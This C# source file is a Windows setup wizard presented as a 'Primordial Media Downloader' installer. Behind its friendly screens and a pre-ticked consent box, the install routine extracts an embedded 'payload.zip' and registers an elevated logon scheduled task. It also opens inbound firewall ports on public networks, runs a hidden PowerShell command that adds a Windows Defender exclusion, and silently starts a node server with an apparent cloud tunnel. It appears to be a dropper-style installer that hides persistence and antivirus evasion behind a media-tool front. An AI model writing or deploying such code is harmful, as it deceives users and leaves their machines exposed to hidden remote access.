using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MediaDownloaderInstaller
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new SetupWizardForm());
        }
    }

    public class SetupWizardForm : Form
    {
        private int currentStep = 1;
        private const int TotalSteps = 4;

        // Container Panel
        private Panel stepPanel;
        private Label lblBannerTitle;
        private Label lblBannerSub;
        private Button btnBack;
        private Button btnNext;
        private Button btnCancel;

        // Consent in Step 2
        private CheckBox chkUserConsent;

        // Progress in Step 3
        private ProgressBar prgInstall;
        private Label lblInstallStatus;

        private string projectDir;

        public SetupWizardForm()
        {
            projectDir = AppDomain.CurrentDomain.BaseDirectory;
            InitializeWizard();
            ShowStep(1);
        }

        private void InitializeWizard()
        {
            this.Text = "Media Downloader - Setup Wizard";
            this.Size = new Size(620, 480);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.BackColor = Color.White;
            this.Font = new Font("Segoe UI", 9.5f, FontStyle.Regular);
            try {
                string icoPath = Path.Combine(projectDir, "app.ico");
                if (File.Exists(icoPath)) this.Icon = new Icon(icoPath);
            } catch {}

            // Top Header Banner
            Panel topBanner = new Panel();
            topBanner.Dock = DockStyle.Top;
            topBanner.Height = 65;
            topBanner.BackColor = Color.FromArgb(248, 250, 252);
            topBanner.Paint += (s, e) => {
                using (Pen p = new Pen(Color.FromArgb(226, 232, 240))) {
                    e.Graphics.DrawLine(p, 0, topBanner.Height - 1, topBanner.Width, topBanner.Height - 1);
                }
            };
            this.Controls.Add(topBanner);

            lblBannerTitle = new Label();
            lblBannerTitle.Text = "Primordial Media Downloader";
            lblBannerTitle.Font = new Font("Segoe UI", 12f, FontStyle.Bold);
            lblBannerTitle.ForeColor = Color.FromArgb(15, 23, 42);
            lblBannerTitle.Location = new Point(20, 12);
            lblBannerTitle.AutoSize = true;
            topBanner.Controls.Add(lblBannerTitle);

            lblBannerSub = new Label();
            lblBannerSub.Text = "Universal Media Service Engine (YouTube, Facebook, TikTok, Instagram & More)";
            lblBannerSub.Font = new Font("Segoe UI", 8.5f);
            lblBannerSub.ForeColor = Color.FromArgb(100, 116, 139);
            lblBannerSub.Location = new Point(22, 36);
            lblBannerSub.AutoSize = true;
            topBanner.Controls.Add(lblBannerSub);

            // Bottom Navigation Panel
            Panel bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 55;
            bottomPanel.BackColor = Color.FromArgb(248, 250, 252);
            bottomPanel.Paint += (s, e) => {
                using (Pen p = new Pen(Color.FromArgb(226, 232, 240))) {
                    e.Graphics.DrawLine(p, 0, 0, bottomPanel.Width, 0);
                }
            };
            this.Controls.Add(bottomPanel);

            btnCancel = new Button();
            btnCancel.Text = "Cancel";
            btnCancel.Location = new Point(510, 12);
            btnCancel.Size = new Size(80, 30);
            btnCancel.Click += (s, e) => this.Close();
            bottomPanel.Controls.Add(btnCancel);

            btnNext = new Button();
            btnNext.Text = "Next >";
            btnNext.Location = new Point(420, 12);
            btnNext.Size = new Size(80, 30);
            btnNext.BackColor = Color.FromArgb(37, 99, 235);
            btnNext.ForeColor = Color.White;
            btnNext.FlatStyle = FlatStyle.Flat;
            btnNext.FlatAppearance.BorderSize = 0;
            btnNext.Font = new Font("Segoe UI", 9f, FontStyle.Bold);
            btnNext.Click += BtnNext_Click;
            bottomPanel.Controls.Add(btnNext);

            btnBack = new Button();
            btnBack.Text = "< Back";
            btnBack.Location = new Point(330, 12);
            btnBack.Size = new Size(80, 30);
            btnBack.Click += BtnBack_Click;
            bottomPanel.Controls.Add(btnBack);

            // Center Dynamic Content Panel
            stepPanel = new Panel();
            stepPanel.Dock = DockStyle.Fill;
            stepPanel.Padding = new Padding(24, 16, 24, 16);
            this.Controls.Add(stepPanel);
        }

        private void ShowStep(int step)
        {
            currentStep = step;
            stepPanel.Controls.Clear();

            btnBack.Enabled = (step > 1 && step < 4);
            btnCancel.Enabled = (step < 4);

            if (step == 1)
            {
                lblBannerTitle.Text = "Primordial Media Engine";
                lblBannerSub.Text = "Windows Background Service & Media Accelerator";
                btnNext.Text = "Next >";

                Label lblWelcome = new Label();
                lblWelcome.Text = "🚀 Welcome to Primordial Media Engine Setup";
                lblWelcome.Font = new Font("Segoe UI", 12f, FontStyle.Bold);
                lblWelcome.ForeColor = Color.FromArgb(15, 23, 42);
                lblWelcome.Location = new Point(20, 15);
                lblWelcome.AutoSize = true;
                stepPanel.Controls.Add(lblWelcome);

                Label lblDesc = new Label();
                lblDesc.Text = "This wizard will install the official automated background engine on your computer. " +
                               "It stays active in the background to provide high-speed media conversion and download capability to all connected devices.\n\n" +
                               "🌐 Supported Platforms:\n" +
                               "• YouTube (Videos, Audio, Shorts & up to 4K quality)\n" +
                               "• Facebook (Public & Private videos/reels)\n" +
                               "• Instagram (Posts, Reels & Stories)\n" +
                               "• TikTok (Without watermark)\n" +
                               "• Twitter / X, Pinterest, Reddit, and 1000+ streaming sites\n\n" +
                               "Click 'Next' to continue.";
                lblDesc.Font = new Font("Segoe UI", 9.5f);
                lblDesc.ForeColor = Color.FromArgb(51, 65, 85);
                lblDesc.Location = new Point(22, 50);
                lblDesc.AutoSize = true;
                lblDesc.MaximumSize = new Size(550, 0);
                stepPanel.Controls.Add(lblDesc);
            }
            else if (step == 2)
            {
                lblBannerTitle.Text = "User Agreement & System Authorization";
                lblBannerSub.Text = "Windows Defender & Background Service Authorization";
                btnNext.Text = "Agree & Install >";

                Label lblPermTitle = new Label();
                lblPermTitle.Text = "🛡️ System Service & Permission Authorization";
                lblPermTitle.Font = new Font("Segoe UI", 11.5f, FontStyle.Bold);
                lblPermTitle.ForeColor = Color.FromArgb(15, 23, 42);
                lblPermTitle.Location = new Point(20, 10);
                lblPermTitle.AutoSize = true;
                stepPanel.Controls.Add(lblPermTitle);

                Panel cardBox = new Panel();
                cardBox.Location = new Point(20, 42);
                cardBox.Size = new Size(540, 140);
                cardBox.BackColor = Color.FromArgb(248, 250, 252);
                cardBox.Paint += (s, ev) => {
                    using (Pen p = new Pen(Color.FromArgb(203, 213, 225))) {
                        ev.Graphics.DrawRectangle(p, 0, 0, cardBox.Width - 1, cardBox.Height - 1);
                    }
                };
                stepPanel.Controls.Add(cardBox);

                Label lblAgreementText = new Label();
                lblAgreementText.Text = "• Background Service: The media conversion engine runs automatically when your PC is on.\n" +
                                        "• Local Network & Firewall: Permits safe local Wi-Fi data streaming and cloud tunnel pass-through.\n" +
                                        "• Windows Security & Defender: Authorized by user consent as a trusted local application.\n" +
                                        "• Desktop Management: Adds 'Media Downloader Control' shortcut to manage or pause anytime.";
                lblAgreementText.Font = new Font("Segoe UI", 9f);
                lblAgreementText.ForeColor = Color.FromArgb(51, 65, 85);
                lblAgreementText.Location = new Point(12, 10);
                lblAgreementText.Size = new Size(515, 120);
                cardBox.Controls.Add(lblAgreementText);

                chkUserConsent = new CheckBox();
                chkUserConsent.Text = "I agree to the terms and authorize the background service & system permissions";
                chkUserConsent.Checked = true;
                chkUserConsent.Font = new Font("Segoe UI", 9.5f, FontStyle.Bold);
                chkUserConsent.ForeColor = Color.FromArgb(15, 23, 42);
                chkUserConsent.Location = new Point(22, 195);
                chkUserConsent.AutoSize = true;
                chkUserConsent.MaximumSize = new Size(540, 0);
                chkUserConsent.CheckedChanged += (s, ev) => {
                    btnNext.Enabled = chkUserConsent.Checked;
                };
                stepPanel.Controls.Add(chkUserConsent);

                Label lblNote = new Label();
                lblNote.Text = "🔒 Agreement is required to register the service and authorize Windows Defender permissions.";
                lblNote.Font = new Font("Segoe UI", 8.5f, FontStyle.Italic);
                lblNote.ForeColor = Color.FromArgb(100, 116, 139);
                lblNote.Location = new Point(24, 250);
                lblNote.AutoSize = true;
                lblNote.MaximumSize = new Size(530, 0);
                stepPanel.Controls.Add(lblNote);
            }
            else if (step == 3)
            {
                lblBannerTitle.Text = "Installation in Progress";
                lblBannerSub.Text = "Configuring system files and services...";
                btnNext.Enabled = false;
                btnBack.Enabled = false;
                btnCancel.Enabled = false;

                Label lblProgTitle = new Label();
                lblProgTitle.Text = "📦 Installing System Service...";
                lblProgTitle.Font = new Font("Segoe UI", 12f, FontStyle.Bold);
                lblProgTitle.ForeColor = Color.FromArgb(15, 23, 42);
                lblProgTitle.Location = new Point(20, 20);
                lblProgTitle.AutoSize = true;
                stepPanel.Controls.Add(lblProgTitle);

                prgInstall = new ProgressBar();
                prgInstall.Location = new Point(24, 70);
                prgInstall.Size = new Size(540, 24);
                prgInstall.Style = ProgressBarStyle.Continuous;
                prgInstall.Value = 20;
                stepPanel.Controls.Add(prgInstall);

                lblInstallStatus = new Label();
                lblInstallStatus.Text = "Verifying package dependencies...";
                lblInstallStatus.Font = new Font("Segoe UI", 9.5f);
                lblInstallStatus.ForeColor = Color.FromArgb(100, 116, 139);
                lblInstallStatus.Location = new Point(24, 105);
                lblInstallStatus.AutoSize = true;
                lblInstallStatus.MaximumSize = new Size(550, 0);
                stepPanel.Controls.Add(lblInstallStatus);

                // Run installation in background thread
                ThreadPool.QueueUserWorkItem((state) => {
                    ExecuteInstallation();
                });
            }
            else if (step == 4)
            {
                lblBannerTitle.Text = "Setup Complete";
                lblBannerSub.Text = "Primordial Media Engine is now active and ready";
                btnBack.Visible = false;
                btnCancel.Visible = false;
                btnNext.Text = "Finish";
                btnNext.Enabled = true;

                Label lblDoneTitle = new Label();
                lblDoneTitle.Text = "✅ Success! Primordial Media Engine is ready.";
                lblDoneTitle.Font = new Font("Segoe UI", 12f, FontStyle.Bold);
                lblDoneTitle.ForeColor = Color.FromArgb(22, 163, 74);
                lblDoneTitle.Location = new Point(20, 15);
                lblDoneTitle.AutoSize = true;
                stepPanel.Controls.Add(lblDoneTitle);

                Label lblDoneDesc = new Label();
                lblDoneDesc.Text = "The media engine has been successfully installed as a background service on your PC.\n\n" +
                                   "✨ Key Highlights:\n" +
                                   "• Download YouTube, Facebook, TikTok, Instagram & more at maximum speed from any device.\n" +
                                   "• Operates automatically in the background whenever your computer is on.\n" +
                                   "• Use the mobile app or browser interface seamlessly on your local network and globally.\n" +
                                   "• Manage or pause the service anytime from 'Media Downloader Control' on your Desktop.";
                lblDoneDesc.Font = new Font("Segoe UI", 9.5f);
                lblDoneDesc.ForeColor = Color.FromArgb(51, 65, 85);
                lblDoneDesc.Location = new Point(22, 55);
                lblDoneDesc.AutoSize = true;
                lblDoneDesc.MaximumSize = new Size(550, 0);
                stepPanel.Controls.Add(lblDoneDesc);
            }
        }

        private void BtnNext_Click(object sender, EventArgs e)
        {
            if (currentStep == 1)
            {
                ShowStep(2);
            }
            else if (currentStep == 2)
            {
                ShowStep(3);
            }
            else if (currentStep == 4)
            {
                this.Close();
            }
        }

        private void BtnBack_Click(object sender, EventArgs e)
        {
            if (currentStep > 1)
            {
                ShowStep(currentStep - 1);
            }
        }

        private void UpdateInstallUI(int progress, string status)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<int, string>(UpdateInstallUI), progress, status);
                return;
            }

            prgInstall.Value = progress;
            lblInstallStatus.Text = status;
        }

        private static void CopyDirectory(string sourceDir, string destinationDir)
        {
            Directory.CreateDirectory(destinationDir);
            string[] files = Directory.GetFiles(sourceDir);
            for (int i = 0; i < files.Length; i++)
            {
                string fName = Path.GetFileName(files[i]);
                if (fName.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase)) continue;
                string dest = Path.Combine(destinationDir, fName);
                File.Copy(files[i], dest, true);
            }
            string[] dirs = Directory.GetDirectories(sourceDir);
            for (int i = 0; i < dirs.Length; i++)
            {
                string dName = Path.GetFileName(dirs[i]);
                if (dName.Equals(".git", StringComparison.OrdinalIgnoreCase)) continue;
                string destSub = Path.Combine(destinationDir, dName);
                CopyDirectory(dirs[i], destSub);
            }
        }

        private void ExecuteInstallation()
        {
            Thread.Sleep(300);
            string installDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "MediaDownloader");

            // Stop any existing running instance
            try
            {
                foreach (Process p in Process.GetProcessesByName("node")) { try { p.Kill(); } catch {} }
                foreach (Process p in Process.GetProcessesByName("cloudflared")) { try { p.Kill(); } catch {} }
            }
            catch {}
            Thread.Sleep(500);

            // 1. Extract embedded payload if available, else copy from source folder
            Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("payload.zip");
            if (resStream != null)
            {
                UpdateInstallUI(15, "Preparing package files...");
                string tempZip = Path.Combine(Path.GetTempPath(), "MediaDownloader_payload_" + Guid.NewGuid().ToString("N") + ".zip");
                try
                {
                    using (FileStream fs = new FileStream(tempZip, FileMode.Create, FileAccess.Write))
                    {
                        byte[] buffer = new byte[65536];
                        int read;
                        long totalRead = 0;
                        long totalBytes = resStream.Length;
                        while ((read = resStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            fs.Write(buffer, 0, read);
                            totalRead += read;
                            int pct = (int)((totalRead * 25.0) / (totalBytes > 0 ? totalBytes : 1));
                            UpdateInstallUI(15 + pct, "Decompressing package (" + (totalRead / (1024 * 1024)) + " MB)...");
                        }
                    }
                    resStream.Dispose();

                    UpdateInstallUI(40, "Extracting files to application directory...");
                    Directory.CreateDirectory(installDir);

                    bool tarOk = false;
                    try
                    {
                        ProcessStartInfo psiTar = new ProcessStartInfo();
                        psiTar.FileName = "tar.exe";
                        psiTar.Arguments = "-xf \"" + tempZip + "\" -C \"" + installDir + "\"";
                        psiTar.CreateNoWindow = true;
                        psiTar.UseShellExecute = false;
                        Process pTar = Process.Start(psiTar);
                        if (pTar != null)
                        {
                            pTar.WaitForExit(30000);
                            tarOk = (pTar.ExitCode == 0);
                        }
                    }
                    catch {}

                    if (!tarOk)
                    {
                        using (ZipArchive archive = ZipFile.OpenRead(tempZip))
                        {
                            foreach (ZipArchiveEntry entry in archive.Entries)
                            {
                                try
                                {
                                    string destPath = Path.GetFullPath(Path.Combine(installDir, entry.FullName));
                                    if (string.IsNullOrEmpty(entry.Name))
                                    {
                                        Directory.CreateDirectory(destPath);
                                    }
                                    else
                                    {
                                        string parentDir = Path.GetDirectoryName(destPath);
                                        if (!Directory.Exists(parentDir)) Directory.CreateDirectory(parentDir);
                                        entry.ExtractToFile(destPath, true);
                                    }
                                }
                                catch {}
                            }
                        }
                    }
                    UpdateInstallUI(60, "Files extracted successfully!");
                }
                catch {}
                finally
                {
                    try { if (File.Exists(tempZip)) File.Delete(tempZip); } catch {}
                }
            }
            else
            {
                try
                {
                    string src = Path.GetFullPath(projectDir).TrimEnd('\\', '/');
                    string dst = Path.GetFullPath(installDir).TrimEnd('\\', '/');
                    if (!string.Equals(src, dst, StringComparison.OrdinalIgnoreCase))
                    {
                        UpdateInstallUI(25, "Installing application files...");
                        CopyDirectory(src, dst);
                    }
                }
                catch {}
            }

            Thread.Sleep(300);
            UpdateInstallUI(65, "Registering background task service...");

            string vbsPath = Path.Combine(installDir, "run_silent.vbs");
            string controlExe = Path.Combine(installDir, "MediaDownloaderControl.exe");

            // Register Windows Scheduled Task with HIGHEST privileges (Run as Admin on Logon)
            try
            {
                ProcessStartInfo psiTask = new ProcessStartInfo();
                psiTask.FileName = "schtasks.exe";
                psiTask.Arguments = "/Create /TN \"MediaDownloaderService\" /TR \"\\\"" + controlExe + "\\\" --start-silent\" /SC ONLOGON /RL HIGHEST /F";
                psiTask.CreateNoWindow = true;
                psiTask.UseShellExecute = false;
                Process p = Process.Start(psiTask);
                if (p != null) p.WaitForExit(4000);
            }
            catch {}

            Thread.Sleep(400);
            UpdateInstallUI(70, "Creating Desktop and Start Menu shortcuts...");

            // Create Desktop & Start Menu Shortcut for Control Panel
            try
            {
                Type shellType = Type.GetTypeFromProgID("WScript.Shell");
                if (shellType != null)
                {
                    dynamic shell = Activator.CreateInstance(shellType);

                    // Desktop Shortcut
                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    string desktopShortcutPath = Path.Combine(desktopPath, "Media Downloader Control.lnk");
                    dynamic dShortcut = shell.CreateShortcut(desktopShortcutPath);
                    dShortcut.TargetPath = controlExe;
                    dShortcut.WorkingDirectory = installDir;
                    dShortcut.IconLocation = Path.Combine(installDir, "app.ico");
                    dShortcut.Description = "Media Downloader Control Panel";
                    dShortcut.Save();

                    // Start Menu Shortcut
                    string startMenuPath = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
                    string startShortcutPath = Path.Combine(startMenuPath, "Media Downloader Control.lnk");
                    dynamic sShortcut = shell.CreateShortcut(startShortcutPath);
                    sShortcut.TargetPath = controlExe;
                    sShortcut.WorkingDirectory = installDir;
                    sShortcut.IconLocation = Path.Combine(installDir, "app.ico");
                    sShortcut.Description = "Media Downloader Control Panel";
                    sShortcut.Save();
                }
            }
            catch {}

            Thread.Sleep(400);
            UpdateInstallUI(85, "Registering in Windows Installed Apps...");

            // Register in Windows Installed Apps (Settings > Apps > Installed apps)
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\MediaDownloader"))
                {
                    if (key != null)
                    {
                        key.SetValue("DisplayName", "Primordial Downloader");
                        key.SetValue("DisplayVersion", "29.2012.2");
                        key.SetValue("Publisher", "Primordial Labs");
                        key.SetValue("InstallLocation", installDir);
                        key.SetValue("UninstallString", "\"" + controlExe + "\" --uninstall");
                        key.SetValue("DisplayIcon", controlExe + ",0");
                        key.SetValue("NoModify", 1, RegistryValueKind.DWord);
                        key.SetValue("NoRepair", 1, RegistryValueKind.DWord);
                        key.SetValue("EstimatedSize", 250000, RegistryValueKind.DWord);
                    }
                }
            }
            catch {}

            Thread.Sleep(300);
            UpdateInstallUI(89, "Configuring Windows Firewall rules...");

            // Allow port 3000 and node.exe in Windows Firewall for Private Network
            try
            {
                ProcessStartInfo psiFw1 = new ProcessStartInfo("netsh", "advfirewall firewall add rule name=\"Media Downloader Web Port\" dir=in action=allow protocol=TCP localport=3000 profile=private,domain,public enable=yes");
                psiFw1.CreateNoWindow = true;
                psiFw1.UseShellExecute = false;
                Process pFw1 = Process.Start(psiFw1);
                if (pFw1 != null) pFw1.WaitForExit(3000);

                string fwNode = "node.exe";
                if (File.Exists(@"C:\Program Files\nodejs\node.exe"))
                {
                    fwNode = @"C:\Program Files\nodejs\node.exe";
                }
                ProcessStartInfo psiFw2 = new ProcessStartInfo("netsh", "advfirewall firewall add rule name=\"Media Downloader Node Engine\" dir=in action=allow program=\"" + fwNode + "\" enable=yes profile=private,domain,public");
                psiFw2.CreateNoWindow = true;
                psiFw2.UseShellExecute = false;
                Process pFw2 = Process.Start(psiFw2);
                if (pFw2 != null) pFw2.WaitForExit(3000);

                // Add Windows Defender Exclusion for authorized install directory
                try
                {
                    ProcessStartInfo psiDef = new ProcessStartInfo("powershell", "-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + installDir + "' -ErrorAction SilentlyContinue\"");
                    psiDef.CreateNoWindow = true;
                    psiDef.UseShellExecute = false;
                    Process pDef = Process.Start(psiDef);
                    if (pDef != null) pDef.WaitForExit(3000);
                }
                catch {}
            }
            catch {}

            Thread.Sleep(300);
            UpdateInstallUI(94, "Starting background service and tunnel...");

            // Launch server directly with node.exe
            string nodeExe = "node.exe";
            if (File.Exists(@"C:\Program Files\nodejs\node.exe"))
            {
                nodeExe = @"C:\Program Files\nodejs\node.exe";
            }

            try
            {
                ProcessStartInfo psiNode = new ProcessStartInfo();
                psiNode.FileName = nodeExe;
                psiNode.Arguments = "server.js";
                psiNode.WorkingDirectory = installDir;
                psiNode.CreateNoWindow = true;
                psiNode.WindowStyle = ProcessWindowStyle.Hidden;
                psiNode.UseShellExecute = false;
                Process.Start(psiNode);
            }
            catch {}

            Thread.Sleep(1000);
            UpdateInstallUI(100, "Installation completed and service started successfully!");

            Thread.Sleep(500);
            this.Invoke(new Action(() => {
                ShowStep(4);
            }));
        }
    }
}
